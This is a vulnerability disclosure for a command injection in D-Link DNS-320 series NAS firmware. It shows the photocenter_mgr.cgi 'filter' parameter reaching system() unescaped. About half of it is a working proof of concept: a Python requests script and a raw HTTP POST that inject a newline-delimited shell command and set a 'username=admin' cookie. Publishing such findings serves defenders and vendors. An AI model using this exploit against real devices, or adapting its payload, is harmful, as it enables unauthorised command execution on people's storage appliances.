# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)

# Affected version
DLINK DNS-320/320L/321/323/325/327L all versions of the firmware
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_photo_search function of the file /cgi-bin/photocenter_mgr.cgi.  The variable `filter`is passed from a POST request and is assigned to `v6` via the `sprintf` function at line 64  and invoked by the `system` command,  the `SpecSymbol2BackSlash` function did not work  which leads to command execution.
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723430373673-1d8528fa-fdd2-4fed-9d11-01507a0aceab.png#averageHue=%23fdfdfd&clientId=u7900f0f6-ca3c-4&from=paste&height=515&id=ue81ec055&originHeight=579&originWidth=1288&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=92762&status=done&style=none&taskId=ua3d4d0ab-1711-4966-84f1-da638ae3de6&title=&width=1144.888888888889)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723430343865-318edfba-b968-4cae-bf51-e02111fe1954.png#averageHue=%23fafaf8&clientId=u7900f0f6-ca3c-4&from=paste&height=158&id=u740ca0a5&originHeight=178&originWidth=1523&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=27616&status=done&style=none&taskId=ubd8ebff7-b733-48b6-b48b-2b3dc1937f1&title=&width=1353.7777777777778)
# POC
```python
import requests

url = "http://192.168.0.32/cgi-bin/photocenter_mgr.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_photo_search&filter=%0atouch%09/tmp/888%0a&type=photos&user=10&page=10&r=10&date=19&album_name=/tmp/"
response = requests.post(url, headers=headers, data=data)
print(response.text)

```

```
POST /cgi-bin/photocenter_mgr.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 110
Origin: http://192.168.0.32
Connection: close
Referer: http://192.168.0.32/photo_center/index.html
Cookie: username=admin
Priority: u=1

cmd=cgi_photo_search&filter=%0atouch%09/tmp/888%0a&type=photos&user=10&page=10&r=10&date=19&album_name=/tmp/
```
